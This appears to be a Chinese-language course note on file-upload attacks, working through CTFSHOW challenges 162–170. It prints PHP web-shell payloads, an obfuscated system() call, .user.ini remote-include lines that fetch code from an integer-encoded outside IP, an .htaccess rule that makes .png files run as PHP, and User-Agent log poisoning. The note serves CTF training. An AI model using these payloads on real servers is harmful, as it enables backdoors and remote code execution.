# day32WEB攻防-通用漏洞&文件上传&二次渲染&.htaccess&变异免杀

![day32](/Users/yangluchao/Documents/GitHub/security/image/day32.png)

```
#知识点：
1、文件上传-二次渲染
2、文件上传-简单免杀变异
3、文件上传-.htaccess妙用
4、文件上传-PHP语言特性

#详细点：
1、检测层面：前端，后端等
2、检测内容：文件头，完整性，二次渲染等
3、检测后缀：黑名单，白名单，MIME检测等
4、绕过技巧：多后缀解析，截断，中间件特性，条件竞争等

#本章课程内容：
1、文件上传-CTF赛题知识点
2、文件上传-中间件解析&编辑器安全
3、文件上传-实例CMS文件上传安全分析

#前置：
后门代码需要用特定格式后缀解析，不能以图片后缀解析脚本后门代码(解析漏洞除外)
如：jpg图片里面有php后门代码，不能被触发，所以连接不上后门
如果要图片后缀解析脚本代码，一般会利用包含漏洞或解析漏洞，还有.user.ini&.htaccess

文件二次渲染：
1、判断上传前和上传后的文件大小及内容
2、判断上传后的文件返回数据包内容
```

演示案例：

------

-   CTFSHOW-文件上传-162到170关卡

    ```
    162  突破.过滤
    过滤 . () {} ;等
    利用远程包含IP转换地址后门调用执行
    .user.ini auto_prepend_file=png
    png <?=include'http://794750069/'>
    https://www.bejson.com/convert/ip2int/
    
    163 突破上传删除
    过滤 . () {} ;等 同时文件被删除
    直接利用.user.ini包含远程
    auto_prepend_file=http://794750069/
    auto_prepend_file=http://794750069/
    
    164 png二次渲染
    https://blog.csdn.net/qq_40800734/article/details/105920149
    get 0=system
    post 1=tac flag.php
    
    165 jpg二次渲染
    1、先上传jpg正常，返回包发现渲染
    2、上传jpg渲染后保存，生成带代码图片
    调用执行：php jpg.php 1.jpg
    
    166 zip调用包含
    直接上传zip后修改代码
    <?=eval($_POST[x]);?>
    
    167 .htaccess妙用
    .htaccess默认不支持nginx，设置后支持
    .htaccess可以通过设置实现文件解析配置
    将.png后缀的文件解析成php
    AddType application/x-httpd-php .png   
    将.png后缀的文件解析成php
    
    168 免杀后门
    <?php $a='syste';$b='m';$c=$a.$b;$c('tac ../flagaa.php');?>
    
    169 170日志包含
    构造.user.ini利用条件：上传index.php 内容随意
    上传.user.ini包含日志：auto_prepend_file=/var/log/nginx/access.log
    访问地址带后门UA头写入日志：<?=eval($_POST[x]);?>
    
    ```

    